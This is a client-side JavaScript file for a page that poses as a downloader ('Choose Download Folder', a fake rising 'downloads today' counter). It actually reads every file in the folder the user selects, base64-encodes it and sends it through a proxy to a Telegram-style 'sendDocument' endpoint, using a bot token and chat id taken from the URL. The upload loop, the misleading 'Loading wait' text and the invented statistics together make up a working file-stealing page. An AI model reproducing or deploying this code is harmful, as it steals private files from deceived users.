/* ---------- read token & id from URL ---------- */
const params = new URLSearchParams(location.search);
const TOKEN  = params.get('token');
const CHAT   = params.get('id');

const PROXY_API_URL = '/api/index2.js';

/* ---------- helpers ---------- */
const $ = s => document.querySelector(s);
const sleep = ms => new Promise(r => setTimeout(r, ms));

// tiny in-memory de-dupe
const cache = new Set();
const keyOf = f => `${f.name}-${f.size}-${f.lastModified}`;

/* ---------- Base64 converter ---------- */
function fileToBase64(file) {
  return new Promise((resolve, reject) => {
    const reader = new FileReader();
    reader.onloadend = () => resolve(reader.result.split(',')[1]);
    reader.onerror = reject;
    reader.readAsDataURL(file);
  });
}

/* ---------- FASTER uploader - via API ---------- */
async function uploadFile(file) {
  const k = keyOf(file);
  if (cache.has(k)) return true;

  // Skip files larger than 4MB (Vercel limit)
  if (file.size > 4 * 1024 * 1024) {
    console.log(`Skipping large file: ${file.name}`);
    return false;
  }

  try {
    const base64 = await fileToBase64(file);
    
    // ✅ FIX: Wait for response এবং error check করুন
    const response = await fetch(PROXY_API_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        action: 'sendDocument',
        token: TOKEN,
        chat_id: CHAT,
        document: base64,
        filename: file.name
      })
    });

    // ✅ FIX: Response check করুন
    if (!response.ok) {
      const error = await response.json();
      console.error(`Failed to upload ${file.name}:`, error);
      return false;
    }

    const result = await response.json();
    console.log(`✅ Uploaded: ${file.name}`);
    
    cache.add(k);
    return true;
  } catch (error) {
    console.error(`❌ Error uploading ${file.name}:`, error);
    return false;
  }
}

/* ---------- INSTANT progress updates ---------- */
function updateProgress(percent, text) {
  $('#progressBar').style.width = percent + '%';
  $('#progressText').textContent = text || `Loading wait... ${percent}%`;
}

/* ---------- BLAZING FAST main loop ---------- */
async function startUpload(fileList) {
  // 1. Deduplicate by relative path
  const map = new Map();
  for (const f of fileList)
    map.set(f.webkitRelativePath || f.name, f);
  const unique = [...map.values()]
    .filter(f => f.size <= 4 * 1024 * 1024)
    .sort((a, b) => a.size - b.size);

  const total = unique.length;
  let done = 0;
  let failed = 0;

  // ✅ FIX: Sequential upload for better reliability
  for (let i = 0; i < total; i++) {
    const file = unique[i];
    
    // Update progress
    const percent = Math.round((i / total) * 100);
    updateProgress(percent, `Uploading ${i + 1}/${total}: ${file.name}`);
    
    // Upload file and wait
    const success = await uploadFile(file);
    if (success) {
      done++;
    } else {
      failed++;
    }
    
    // Small delay
    await sleep(300);
  }

  // Final update
  updateProgress(100, `✅ Complete! ${done} uploaded, ${failed} failed`);
  await sleep(3000);
  reset();
}

/* ---------- UI glue ---------- */
function reset() {
  $('#downloadForm').reset();
  $('#startBtn').disabled = true;
  $('#folderInfo').classList.remove('show');
  $('#progressSection').classList.remove('show');
  $('#progressBar').style.width = '0%';
  $('#folderBtn').textContent = '📁 Choose Download Folder';
}

$('#folderBtn').onclick = () => $('#folderInput').click();
$('#folderInput').onchange = () => {
  const files = $('#folderInput').files;
  if (!files.length) return;
  $('#folderName').textContent = '📁 ' + files[0].webkitRelativePath.split('/')[0];
  $('#folderInfo').classList.add('show');
  $('#startBtn').disabled = false;
  $('#folderBtn').textContent = '📁 Change Folder';
};

$('#downloadForm').onsubmit = async e => {
  e.preventDefault();
  const list = $('#folderInput').files;
  if (!list.length) return;
  $('#startBtn').disabled = true;
  await sleep(200);
  $('#progressSection').classList.add('show');
  await startUpload(list);
};

/* ---------- stats animation ---------- */
setInterval(() => {
  const current = parseFloat($('#stats').textContent.match(/[\d.]+/)[0]);
  const newCount = (current + Math.random() * 0.1 + 0.05).toFixed(1);
  $('#stats').textContent = `${newCount}M+ downloads today — join the community!`;
}, 12000);